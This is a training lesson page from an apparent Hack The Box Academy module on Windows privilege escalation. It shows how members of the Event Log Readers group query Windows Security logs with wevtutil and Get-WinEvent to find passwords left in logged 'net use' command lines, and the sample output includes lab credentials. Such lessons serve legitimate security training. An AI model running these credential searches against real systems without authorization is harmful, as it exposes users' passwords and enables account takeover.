<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/67/section/602
// Platform Version: V1
// Module ID: 67
// Module Name: Windows Privilege Escalation
// Module Difficulty: Medium
// Section ID: 602
// Section Title: Event Log Readers
// Page Title: Hack The Box - Academy
// Page Number: 11
-->

# Event Log Readers

**Module Name:** Windows Privilege Escalation **Page Number:** 11

#### 

#### WINDOWS PRIVILEGE ESCALATION

# Event Log Readers

#### Confirming Group Membership

``` cmd-session
C:\htb> net localgroup "Event Log Readers"

Alias name     Event Log Readers
Comment        Members of this group can read event logs from local machine

Members

-------------------------------------------------------------------------------
logger
The command completed successfully.
```

#### Searching Security Logs Using wevtutil

``` powershell-session
PS C:\htb> wevtutil qe Security /rd:true /f:text | Select-String "/user"

        Process Command Line:   net use T: \\fs01\backups /user:tim MyStr0ngP@ssword
```

#### Passing Credentials to wevtutil

``` cmd-session
C:\htb> wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
```

#### Searching Security Logs Using Get-WinEvent

``` powershell-session
PS C:\htb> Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}

CommandLine
-----------
net use T: \\fs01\backups /user:tim MyStr0ngP@ssword
```

# 

# 

#### Questions

####